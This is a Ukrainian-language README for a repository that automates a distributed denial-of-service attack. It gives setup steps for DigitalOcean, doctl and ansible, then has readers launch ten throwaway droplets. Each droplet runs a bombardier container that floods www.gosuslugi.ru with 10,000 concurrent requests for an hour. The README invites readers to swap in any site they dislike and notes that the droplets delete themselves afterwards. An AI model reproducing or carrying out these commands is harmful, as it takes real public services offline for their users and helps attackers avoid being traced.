Інструкція з розгортання 10-ти дроплетів в хмарі digitalocean

1. Встановіть Linux у VirtualBox або LXC контейнер. https://www.youtube.com/watch?v=-hNMW1PMq4w (Дай Бог здоров'я тобі, Кірюха)
2. Зарееструйтеся в DigitalOcean https://www.websiteplanet.com/ru/blog/%D0%BA%D0%B0%D0%BA-%D0%B7%D0%B0%D1%80%D0%B5%D0%B3%D0%B8%D1%81%D1%82%D1%80%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C-%D0%B0%D0%BA%D0%BA%D0%B0%D1%83%D0%BD%D1%82-%D0%BD%D0%B0-%D1%81%D0%B5%D1%80%D0%B2/
3. Створіть та додайте ssh-key https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys-2
4. Встановіть та зареєструйте doctl (https://docs.digitalocean.com/reference/doctl/how-to/install/)
5. Встановіть git:   sudo yum install git
6. Встановіть ansible https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html#installing-ansible-on-rhel-centos-or-fedora
7. скопіюйте репозиторій git clone git@github.com:Pingva74/digitalocean-helper.git
8. надайте права виконання файлу do.ddos.sh як що їх немає: chmod 755 do.ddos.sh

За замовчанням ви можете створити 10 віртуальних машин вартістю $5 на місяць, цього досить.
Невеличке пояснення що ви створюєте, команда виглядає так:

doctl compute droplet create --region tor1 --image centos-7-x64 --size s-1vcpu-1gb --ssh-keys 30188579  zero0

Нас в ній цікавить --region tor1 - регіон в якому буде створений дроплет, перелік регіонів можна отримати так: 
doctl compute region list

отримаете приблизно такий перелік:

doctl compute region list

Slug    Name               Available

nyc1    New York 1         true

sfo1    San Francisco 1    false

nyc2    New York 2         false

ams2    Amsterdam 2        false

sgp1    Singapore 1        true

lon1    London 1           true

nyc3    New York 3         true

ams3    Amsterdam 3        true

fra1    Frankfurt 1        true

tor1    Toronto 1          true

sfo2    San Francisco 2    false

blr1    Bangalore 1        true

sfo3    San Francisco 3    true


--ssh-keys 30188579 - ключ доступу до дроплета, отримати перелік ключів можна так: doctl compute ssh-key list
отримаемо схожу відповідь:

doctl compute ssh-key list

ID          Name        FingerPrint

30245974    oracle      73:dd:87:ed:05:40:58:26:25:1d:7d:b2:b0:5f:ab:1e

30188579    home        44:10:69:cd:39:cd:ac:01:04:92:a0:78:37:77:29:9b


Нам треба вказати --ssh-keys <ID> Вашого ключа, вони індивідуальні.
zero0 - це ім'я дроплету.
крім того можемо відредагувати файл docker.yml
нас цікавить тільки рядок

 shell: "docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l www.gosuslugi.ru"

де
-с 10000 - кількість одночасно надісланих запитів
-d 3600s - час життя контейнера в секундах (можливо міняти на свій розсуд)
-l www.gosuslugi.ru - сайт, який вам набрид.

Після завершення роботи контейнера, всі дроплети видаляться автоматично.
Користуйтеся з задоволенням, Слава Україні!
